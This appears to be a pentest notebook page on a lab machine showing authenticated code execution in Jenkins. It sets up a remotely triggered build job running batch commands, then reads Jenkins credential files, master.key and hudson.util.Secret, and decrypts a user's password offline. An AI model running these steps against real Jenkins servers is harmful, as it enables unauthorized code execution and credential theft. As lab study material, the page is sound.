# Jenkins

## Authenticated RCE

Create a new freestyle project

![](Attachments/Pasted%20image%2020250212004500.png)

![](Attachments/Pasted%20image%2020250212004609.png)

After creating a project, we can go to `Configure > Build Triggers > Trigger builds remotely` and enter an abritrary authentication token.

![](Attachments/Pasted%20image%2020250212005159.png)

We can then click on `Build > Add build step > Execute a windows batch command` and enter `whoami`.

![](Attachments/Pasted%20image%2020250212005948.png)

![](Attachments/Pasted%20image%2020250212010020.png)

From here we can save and click our profile at the top and go to `Configure > API Token > Add new Token` and enter the name of the token we created earlier.

![](Attachments/Pasted%20image%2020250212010203.png)

From here, we can enter the following url with the copied token:

```powershell
# Format: http://<token_name>:<token>@<url>/job/<job_name>/build?token=<build_token_name>
curl http://asdf:11e843e974f54c15caf038d8946165c4df@10.129.96.147:8080/job/asdf/build?token=asdf
```

![](Attachments/Pasted%20image%2020250212010555.png)

From here, we can't actually start a socket with a powershell cradle, but we can look for credentials of other users.

```powershell
cmd.exe /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users"
```

From here we can see the admin user folder.

![](Attachments/Pasted%20image%2020250212011022.png)

We can now view the `config.xml` file for the admin directory.

```powershell
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

![](Attachments/Pasted%20image%2020250212011556.png)

From here, we see the user `oliver`. We can save this file as `credentials.xml` and download the following additional files.

```powershell
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key"
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"
```

We can then save this output as follows.

```powershell
echo 'f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19' > master.key

echo 'gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=' | base64 -d > hudson.util.Secret
```

We can now decrypt `oliver`'s password with [jenkins_offline_decrypt.py](https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py).

```bash
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```

![](Attachments/Pasted%20image%2020250212012411.png)

See [this](https://0xdf.gitlab.io/2022/02/28/htb-object.html) writeup for additional details.
